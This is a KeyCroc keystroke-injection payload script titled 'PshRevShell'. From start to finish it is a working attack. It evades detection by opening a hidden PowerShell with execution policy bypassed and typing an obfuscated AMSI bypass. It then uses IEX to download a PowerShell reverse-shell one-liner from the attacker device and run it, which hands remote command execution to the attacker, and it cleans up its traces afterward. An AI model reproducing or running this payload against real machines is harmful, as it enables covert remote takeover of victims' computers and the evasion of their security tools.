# Title: PshRevShell
# Description: A fileless PowerShell reverse shell to the KeyCroc
# Author: cerebro11 
# Date: 28/07/2020
# 
# A netcat listener should be ran on the KeyCroc before executing the payload (ex: "nc -nvlp 4444")
# Requirements: gohttp

MATCH __croc_revshell

# Step 0: Specify target's PC keyboard language
#export DUCKY_LANG=fr

# Step 1: Change to ETHERNET ATTACKMODE (Windows)
LED SETUP
if [ ! -f "/tmp/vidpid" ]
then
        ATTACKMODE RNDIS_ETHERNET HID VID_0X1234 PID_0X5678
else
        VENDOR=$(cat /tmp/vidpid | cut -d: -f1)
        PRODUCT=$(cat /tmp/vidpid | cut -d: -f2)
        ATTACKMODE RNDIS_ETHERNET HID VID_0X$VENDOR PID_0X$PRODUCT
fi
QUACK DELAY 5000

# Step 2: Get KeyCroc's LAN IP
croc_ip=$(ifconfig usb0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
croc_port=4444

# Step 3: Prepare scripts and run web service
mkdir -p /tmp/www
echo "\$client = New-Object System.Net.Sockets.TCPClient('${croc_ip}',${croc_port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" > /tmp/www/Invoke-PowerShellTcpOneLine.ps1
cd /tmp/www/ && gohttp -p 80 &

# Step 4: Inject KeyStrokes to bypass AMSI and spawn reverse shell
LED ATTACK
QUACK LOCK
QUACK GUI-r
QUACK DELAY 20
QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
QUACK ENTER
QUACK DELAY 20
QUACK STRING "[Ref].Assembly.GetType('Sy'+'stem.Managem'+'ent.Aut'+'omation.Am'+'s'+'iUt'+'ils').GetField('a'+'m'+'si'+'In'+'itFa'+'iled','No'+'nPub'+'lic,Static').SetValue(\$null,\$true)"
QUACK ENTER
QUACK STRING "IEX (New-Object Net.WebClient).DownloadString('http://${croc_ip}/Invoke-PowerShellTcpOneLine.ps1')"
QUACK ENTER
QUACK UNLOCK

# Step 5: Clean
LED CLEAN
sleep 10
kill $(ps -C "gohttp -p 80" -o pid --no-headers)
rm -rf /tmp/www/

LED FINISH
